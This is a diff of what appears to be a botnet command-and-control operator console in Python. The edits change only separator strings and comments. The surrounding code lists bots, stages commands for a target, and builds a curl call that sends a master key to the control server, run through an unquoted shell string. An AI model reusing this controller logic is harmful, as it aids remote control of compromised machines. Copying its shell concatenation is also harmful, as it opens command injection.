@@ -170,7 +170,7 @@ ___  ___          _              _____                       _
         url = URL + '/bot/list'
         res = requests.get(url)
 
-        botlist = "===================================\n"
+        botlist = "==========================================================\n"
         botlist += res.text
 
         output_botlist = ansi.style(botlist, fg='green', bold=True)
@@ -192,7 +192,7 @@ ___  ___          _              _____                       _
         url = URL + '/bot/commands'
         res = requests.get(url)
 
-        commandlist = "===================================\n"
+        commandlist = "==========================================================\n"
         commandlist += res.text
 
         output_botlist = ansi.style(commandlist, fg='green', bold=True)
@@ -222,10 +222,10 @@ ___  ___          _              _____                       _
         self.poutput(output_push)
         self.poutput(res.text)
 
-        # If command staging was successful 
+        # If command staging was successful, check the result page after TIMER.
         if 'result' in res.text:
             # This "hack" was used due to lack of knowledge of asyncio. Will come back to this... 
-            payload = "sleep " + TIMER + "; echo '\n[" + args.target + "] #" + args.command + "\n==========================================================\n';  curl -X POST -d 'masterkey'='" + MASTERKEY + "' " + URL + "/bot/" + args.target + "/result"
+            payload = "sleep " + TIMER + "; echo '\n[" + args.target + "] # " + args.command + "\n==========================================================\n';  curl -X POST -d 'masterkey'='" + MASTERKEY + "' " + URL + "/bot/" + args.target + "/result"
             #print("[*] payload = ", payload)
             process = Popen(payload, shell=True)
 
